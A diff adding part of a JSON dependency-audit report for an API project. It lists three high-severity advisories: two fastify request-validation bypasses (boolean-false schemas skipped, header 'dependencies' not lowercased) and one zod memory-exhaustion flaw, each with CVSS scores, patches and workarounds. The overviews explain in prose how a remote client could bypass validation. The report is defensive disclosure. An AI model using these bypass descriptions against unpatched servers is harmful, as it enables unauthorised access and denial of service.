+      "references": "- https://github.com/fastify/fastify/security/advisories/GHSA-hwr6-493r-vm6h\n- https://nvd.nist.gov/vuln/detail/CVE-2026-84469\n- https://github.com/fastify/fastify/commit/7de6e81697778f9f41bd327a3b1c5c9a0d9637b4\n- https://cna.openjsf.org/security-advisories.html\n- https://github.com/fastify/fastify/releases/tag/v5.12.2\n- https://github.com/advisories/GHSA-hwr6-493r-vm6h",
+      "created": "2026-09-30T23:44:58.000Z",
+      "id": 1240643,
+      "npm_advisory_id": null,
+      "overview": "### Impact\n\nFastify decided whether to validate a request part by checking its schema for JavaScript truthiness. JSON Schema Draft 7 defines the boolean `false` as a valid schema that rejects every instance, but because `false` is falsy, a route that set `body`, `querystring`, `params`, or `headers` to `false` had that part left uncompiled: no validator was attached and the request reached the handler. An application that used `false` as a deny-all schema to make a route unreachable was therefore fully bypassed, and an unauthenticated remote client could reach the handler with any input. The same applied to the documented `query` alias for `querystring`. This is a complete bypass rather than a weak-schema issue, since `false` is the strongest JSON Schema assertion and must always fail.\n\n### Patches\n\nRequest-part schemas are now selected by an explicit presence check rather than truthiness, so a boolean `false` (or `true`) schema is compiled and enforced, including through the `query` alias. Patched in fastify `5.12.2`. The fix is also included in the `6.0.0` release.\n\n### Workarounds\n\nIf upgrading is not immediately possible, express a deny-all request schema with an always-failing object schema instead of the boolean `false` (for example `{ \"not\": {} }`), or reject the request in an `onRequest` hook.",
+      "reported_by": null,
+      "title": "fastify vulnerable to request validation bypass via skipped boolean false schemas",
+      "metadata": null,
+      "cves": [
+        "CVE-2026-84469"
+      ],
+      "access": "public",
+      "severity": "high",
+      "module_name": "fastify",
+      "vulnerable_versions": "<5.12.2",
+      "github_advisory_id": "GHSA-hwr6-493r-vm6h",
+      "recommendation": "Upgrade to version 5.12.2 or later",
+      "patched_versions": ">=5.12.2",
+      "updated": "2026-09-30T23:44:59.000Z",
+      "cvss": {
+        "score": 7.5,
+        "vectorString": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:H/A:N"
+      },
+      "cwe": [
+        "CWE-20"
+      ],
+      "url": "https://github.com/advisories/GHSA-hwr6-493r-vm6h"
+    },
+    "1240644": {
+      "findings": [
+        {
+          "version": "5.6.1",
+          "paths": [
+            "apps__api>fastify"
+          ]
+        }
+      ],
+      "found_by": null,
+      "deleted": null,
+      "references": "- https://github.com/fastify/fastify/security/advisories/GHSA-9q9j-q6p8-xq58\n- https://nvd.nist.gov/vuln/detail/CVE-2026-84428\n- https://github.com/fastify/fastify/commit/179619c8e99d54924309b9933402151ef9af37e0\n- https://cna.openjsf.org/security-advisories.html\n- https://github.com/fastify/fastify/releases/tag/v5.12.2\n- https://github.com/advisories/GHSA-9q9j-q6p8-xq58",
+      "created": "2026-09-30T23:44:27.000Z",
+      "id": 1240644,
+      "npm_advisory_id": null,
+      "overview": "### Impact\n\nFastify lowercases header-schema property names before compiling the schema, because Node.js stores request header names in lowercase. That normalization was incomplete: it lowercased only top-level `properties` keys and the root `required` array, and did not lowercase the JSON Schema Draft 7 `dependencies` keyword (its trigger keys and dependent property names) or names in nested subschemas. As a result, a header schema that uses `dependencies` to require one header when another is present (for example `X-Admin` requiring `X-Admin-Token`) never matches the lowercased request headers, so the dependency assertion is silently skipped. An unauthenticated remote client can send the header that activates a privileged path while omitting the header the dependency was meant to require, bypassing a schema-enforced security control. The header schema is idiomatic, valid JSON Schema Draft 7, and no custom validator, malformed request, or misconfiguration is required.\n\n### Patches\n\nHeader-schema names are now normalized across all schema positions (`properties`, `required`, `dependencies`, `dependentRequired`, `dependentSchemas`, and nested subschemas). Patched in fastify `5.12.2`. The fix is also included in the `6.0.0` release. Header schemas referenced through an external shared `$ref` (registered with `addSchema`) are not reached by this normalization and now emit an `FSTSEC002` startup warning; inline the header schema to keep case-insensitive assertions in effect.\n\n### Workarounds\n\nIf upgrading is not immediately possible, write header-schema names in lowercase so the `dependencies` and other case-sensitive assertions match Node's lowercased request headers, or enforce the cross-header requirement in an `onRequest` or `preValidation` hook instead of the schema.",
+      "reported_by": null,
+      "title": "fastify vulnerable to header validation bypass via incomplete schema case normalization",
+      "metadata": null,
+      "cves": [
+        "CVE-2026-84428"
+      ],
+      "access": "public",
+      "severity": "high",
+      "module_name": "fastify",
+      "vulnerable_versions": "<5.12.2",
+      "github_advisory_id": "GHSA-9q9j-q6p8-xq58",
+      "recommendation": "Upgrade to version 5.12.2 or later",
+      "patched_versions": ">=5.12.2",
+      "updated": "2026-09-30T23:44:29.000Z",
+      "cvss": {
+        "score": 7.5,
+        "vectorString": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:H/A:N"
+      },
+      "cwe": [
+        "CWE-178"
+      ],
+      "url": "https://github.com/advisories/GHSA-9q9j-q6p8-xq58"
+    },
+    "1243066": {
+      "findings": [
+        {
+          "version": "4.1.12",
+          "paths": [
+            "apps__api>zod"
+          ]
+        }
+      ],
+      "found_by": null,
+      "deleted": null,
+      "references": "- https://nvd.nist.gov/vuln/detail/CVE-2023-54404\n- https://github.com/colinhacks/zod/issues/1872\n- https://github.com/colinhacks/zod/pull/6475\n- https://www.vulncheck.com/advisories/zod-uncontrolled-resource-consumption-via-array-validation\n- https://github.com/colinhacks/zod/pull/6652\n- https://github.com/colinhacks/zod/commit/a0ebf970f2d752e5f58527cd2942ff48be4f46bd\n- https://github.com/advisories/GHSA-mrhx-c7xc-m3w5",
+      "created": "2026-10-01T18:32:46.000Z",
+      "id": 1243066,
+      "npm_advisory_id": null,
+      "overview": "Zod schema-validation library through 4.6.5 contains an uncontrolled resource consumption vulnerability that allows attackers to exhaust memory by submitting a large array to an application using an array schema without a length constraint. Attackers can exploit the handleArrayResult parse logic in $ZodArray, which accumulates every validation issue for each failing element with no cap or early termination, causing the process to allocate excessive issue objects and crash due to out-of-memory conditions.",
+      "reported_by": null,
+      "title": "Zod can exhaust memory while validating oversized constrained collections",
+      "metadata": null,
+      "cves": [
+        "CVE-2023-54404"
+      ],
+      "access": "public",
+      "severity": "high",
+      "module_name": "zod",
+      "vulnerable_versions": "<4.6.6",
+      "github_advisory_id": "GHSA-mrhx-c7xc-m3w5",
+      "recommendation": "Upgrade to version 4.6.6 or later",
+      "patched_versions": ">=4.6.6",
+      "updated": "2026-10-23T18:26:52.000Z",
+      "cvss": {
+        "score": 7.5,
+        "vectorString": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H"
+      },
+      "cwe": [
+        "CWE-770"
+      ],
+      "url": "https://github.com/advisories/GHSA-mrhx-c7xc-m3w5"
+    }
+  },
+  "muted": [],
+  "metadata": {
+    "vulnerabilities": {
+      "info": 0,
+      "low": 5,
+      "moderate": 18,
+      "high": 20,
+      "critical": 0
+    },
+    "dependencies": 182,
+    "devDependencies": 0,
+    "optionalDependencies": 0,
+    "totalDependencies": 182
+  }
+}
